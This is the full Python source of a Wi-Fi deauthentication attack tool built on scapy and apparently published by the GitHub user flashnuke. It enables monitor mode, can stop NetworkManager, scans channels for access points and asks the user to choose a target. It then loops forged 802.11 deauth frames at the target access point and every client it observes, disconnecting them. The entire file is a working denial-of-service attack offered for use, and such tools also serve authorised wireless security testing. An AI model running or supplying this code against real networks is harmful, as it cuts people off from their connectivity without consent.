#!/usr/bin/env python3

import argparse
import pkg_resources
import traceback
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings

from scapy.all import *
from time import sleep
from utils import *

conf.verb = 0


#   --------------------------------------------------------------------------------------------------------------------
#   ....................................................................................................................
#   .....................__      __ __  _____ __         _________                          __   __ ....................
#   ..................../  \    /  \__|/ ____\__|        \    __  \   ____  _____    __ ___/  |_|  |__..................
#   ....................\   \/\/   /  \   __\|  |  ______ |  |  \  \/ ___ \ \  __ \ |  |  \   __|  |  \.................
#   .....................\        /|  ||  |  |  | /_____/ |  |__/  /\  ___/ | |__\ \|  |  /|  | |   Y  \................
#   ......................\__/\__/ |__||__|  |__|         |_______/  \_____/_______/ ____/ |__| |___|__/................
#   ....................................................................................................................
#   Ⓒ by https://github.com/flashnuke Ⓒ................................................................................
#   --------------------------------------------------------------------------------------------------------------------

class Interceptor:
    _BROADCAST_MACADDR = "ff:ff:ff:ff:ff:ff"
    _NON_OVERLAPPING_CHANNELS = {1, 6, 11,  # 2.4GHz
                                 36, 44, 52, 60, 100, 108, 116, 124, 132, 140, 149, 157}  # 5GHz

    def __init__(self, net_iface, skip_monitor_mode_setup, kill_networkmanager, all_channels, *args, **kwargs):
        self.interface = net_iface
        self._all_channels = all_channels
        self._channel_sniff_timeout = 2
        self._scan_intv = 0.1
        self._deauth_intv = 0.1
        self._printf_res_intv = 1
        self._ssid_str_pad = 42  # total len 80

        self._abort = False
        self._current_channel_num = None
        self._current_channel_aps = set()

        self.attack_loop_count = 0

        self.target_ssid = dict()  # ssid stats

        if not skip_monitor_mode_setup:
            print_info(f"Setting up monitor mode...")
            if not self._enable_monitor_mode():
                print_error(f"Monitor mode was not enabled properly")
                raise Exception("Unable to turn on monitor mode")
            print_info(f"Monitor mode was set up successfully")
        else:
            print_info(f"Skipping monitor mode setup...")

        if kill_networkmanager:
            print_info(f"Killing NetworkManager...")
            if not self._kill_networkmanager():
                print_error(f"Failed to kill NetworkManager...")

        self._channel_range = {channel: defaultdict(dict) for channel in self._get_channels()}

    def _enable_monitor_mode(self):
        for cmd in [f"sudo ip link set {self.interface} down",
                    f"sudo iw {self.interface} set monitor control",
                    f"sudo ip link set {self.interface} up"]:
            print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
            if os.system(cmd):
                return False
        return True

    @staticmethod
    def _kill_networkmanager():
        cmd = 'systemctl stop NetworkManager'
        print_cmd(f"Running command -> '{BOLD}{cmd}{RESET}'")
        return not os.system(cmd)

    def _set_channel(self, ch_num):
        os.system(f"iw dev {self.interface} set channel {ch_num}")
        self._current_channel_num = ch_num

    def _get_channels(self) -> List[int]:
        all_channels = [int(channel.split('Channel')[1].split(':')[0].strip())
                        for channel in os.popen(f'iwlist {self.interface} channel').readlines()
                        if 'Channel' in channel and 'Current' not in channel]
        return [ch for ch in all_channels if ch in Interceptor._NON_OVERLAPPING_CHANNELS or self._all_channels]

    def _ap_sniff_cb(self, pkt):
        try:
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                ap_mac = str(pkt.addr3)
                ssid = pkt[Dot11Elt].info.decode().strip() or ap_mac
                if ap_mac == self._BROADCAST_MACADDR or not ssid:
                    return
                if ssid not in self._channel_range[self._current_channel_num]:
                    self._channel_range[self._current_channel_num][ssid] = \
                        self._init_ap_dict(ap_mac, self._current_channel_num)
            else:
                self._clients_sniff_cb(pkt)  # pass forward to find potential clients
        except:
            pass

    def _scan_channels_for_aps(self):
        try:
            for idx, ch_num in enumerate(self._channel_range):
                self._set_channel(ch_num)
                print_info(f"Scanning channel {self._current_channel_num} ({idx + 1}"
                           f" out of {len(self._channel_range)})", end="\r")
                sniff(prn=self._ap_sniff_cb, iface=self.interface, timeout=self._channel_sniff_timeout)
        except KeyboardInterrupt:
            return
        finally:
            printf("")

    def _start_initial_ap_scan(self) -> dict:
        print_info(f"Starting AP scan, please wait... ({len(self._channel_range)} channels total)")

        self._scan_channels_for_aps()

        ctr = 0
        target_map = dict()
        printf(DELIM)
        pref = '[   ] '
        printf(f"{pref}{self._generate_ssid_str('SSID Name', 'Channel', 'MAC Address', len(pref))}")

        for channel, all_channel_aps in self._channel_range.items():
            for ssid, ssid_stats in all_channel_aps.items():
                if not ssid or not ssid_stats:
                    continue
                ctr += 1
                target_map[ctr] = copy.deepcopy(ssid_stats)
                target_map[ctr]['ssid'] = ssid
                pref = f"[{str(ctr).rjust(3, ' ')}] "
                preflen = len(pref)
                pref = f"[{BOLD}{PURPLE}{str(ctr).rjust(3, ' ')}{RESET}] "
                printf(f"{pref}{self._generate_ssid_str(ssid, ssid_stats['channel'], ssid_stats['mac_addr'], preflen)}")
        if not target_map:
            print_error("Not APs were found, quitting...")
            self._abort = True
            exit(0)

        chosen = -1
        while chosen not in target_map.keys():
            chosen = int(print_input(f"Choose a target from {min(target_map.keys())} to {max(target_map.keys())}:"))

        return target_map[chosen]

    def _generate_ssid_str(self, ssid, ch, mcaddr, preflen):
        return f"{ssid.ljust(self._ssid_str_pad - preflen, ' ')}{str(ch).ljust(3, ' ').ljust(self._ssid_str_pad // 2, ' ')}{mcaddr}"

    def _clients_sniff_cb(self, pkt):
        try:
            if self._packet_confirms_client(pkt):
                ap_mac = str(pkt.addr3)
                if ap_mac == self.target_ssid["mac_addr"]:
                    c_mac = pkt.addr1
                    if c_mac != self._BROADCAST_MACADDR and c_mac not in self.target_ssid["clients"]:
                        self.target_ssid["clients"].append(c_mac)
        except:
            pass

    @staticmethod
    def _packet_confirms_client(pkt):
        return (pkt.haslayer(Dot11AssoResp) and pkt[Dot11AssoResp].status == 0) or \
               (pkt.haslayer(Dot11ReassoResp) and pkt[Dot11ReassoResp].status == 0) or \
               pkt.haslayer(Dot11QoS)

    def _listen_for_clients(self):
        print_info(f"Setting up a listener for new clients...")
        sniff(prn=self._clients_sniff_cb, iface=self.interface, stop_filter=lambda p: self._abort is True)

    def _run_deauther(self):
        try:
            print_info(f"Starting de-auth loop...")

            ap_mac = self.target_ssid["mac_addr"]

            rd_frm = RadioTap()
            deauth_frm = Dot11Deauth(reason=7)
            while not self._abort:
                self.attack_loop_count += 1
                sendp(rd_frm /
                      Dot11(addr1=self._BROADCAST_MACADDR, addr2=ap_mac, addr3=ap_mac) /
                      deauth_frm,
                      iface=self.interface)
                for client_mac in self.target_ssid["clients"]:
                    sendp(rd_frm /
                          Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
                          deauth_frm,
                          iface=self.interface)
                    sendp(rd_frm /
                          Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) /
                          deauth_frm,
                          iface=self.interface)
            sleep(self._deauth_intv)
        except Exception as exc:
            print_error(f"Exception in deauth-loop -> {traceback.format_exc()}")
            self._abort = True
            exit(0)

    def run(self):
        self.target_ssid = self._start_initial_ap_scan()
        print_info(f"Attacking target {self.target_ssid['ssid']}")
        print_info(f"Setting channel -> {self.target_ssid['channel']}")
        self._set_channel(self.target_ssid['channel'])

        for action in [self._run_deauther, self._listen_for_clients]:
            t = Thread(target=action, args=tuple(), daemon=True)
            t.start()

        printf(DELIM)
        printf("")
        try:
            start = self.get_time()
            while not self._abort:
                print_info(f"Target SSID{self.target_ssid['ssid'].rjust(80 - 15, ' ')}")
                print_info(f"Channel{str(self.target_ssid['channel']).rjust(80 - 11, ' ')}")
                print_info(f"MAC addr{self.target_ssid['mac_addr'].rjust(80 - 12, ' ')}")
                print_info(f"Net interface{self.interface.rjust(80 - 17, ' ')}")
                print_info(f"Confirmed clients{BOLD}{str(len(self.target_ssid['clients'])).rjust(80 - 21, ' ')}{RESET}")
                print_info(f"Elapsed sec {BOLD}{str(self.get_time() - start).rjust(80 - 16, ' ')}{RESET}")
                sleep(self._printf_res_intv)
                clear_line(7)
        except KeyboardInterrupt:
            printf(f"\n{DELIM}")
            print_error(f"User asked to stop, quitting...")

    @staticmethod
    def _init_ap_dict(mac_addr: str, ch: int) -> dict:
        return {
            "channel": ch,
            "mac_addr": mac_addr,
            "clients": list()
        }

    @staticmethod
    def get_time():
        return int(time.time())


if __name__ == "__main__":
    printf(f"\n{BANNER}\n"
           f"Make sure of the following:\n"
           f"1. You are running as {BOLD}sudo{RESET}\n"
           f"2. You kill NetworkManager (manually or by passing {BOLD}--kill{RESET})\n"
           f"3. Your wireless adapter supports {BOLD}monitor mode{RESET} (refer to docs)\n\n"
           f"Written by {BOLD}@flashnuke{RESET}")
    printf(DELIM)

    if "linux" not in platform:
        raise Exception(f"Unsupported operating system {platform}, only linux is supported...")
    with open("requirements.txt", "r") as reqs:
        pkg_resources.require(reqs.readlines())

    # arguments = define_args()
    parser = argparse.ArgumentParser(description='A simple program to perform a deauth attack')
    parser.add_argument('-i', '--iface', help='a network interface with monitor mode enabled (i.e -> "eth0")',
                        action='store', dest="net_iface", metavar="network_interface", required=True)
    parser.add_argument('-sm', '--skip-monitormode', help='skip automatic setup of monitor mode', action='store_true',
                        default=False, dest="skip_monitormode", required=False)
    parser.add_argument('-k', '--kill', help='kill NetworkManager (might interfere with the process)',
                        action='store_true', default=False, dest="kill_networkmanager", required=False)
    parser.add_argument('-a', '--all-channels', help="don't filter by overlapping channels (use only if you know what "
                                                     "you're doing!)",
                        action='store_true', default=False, dest="all_channels", required=False)
    pargs = parser.parse_args()

    invalidate_print()  # after arg parsing
    attacker = Interceptor(net_iface=pargs.net_iface,
                           skip_monitor_mode_setup=pargs.skip_monitormode,
                           kill_networkmanager=pargs.kill_networkmanager,
                           all_channels=pargs.all_channels)
    attacker.run()
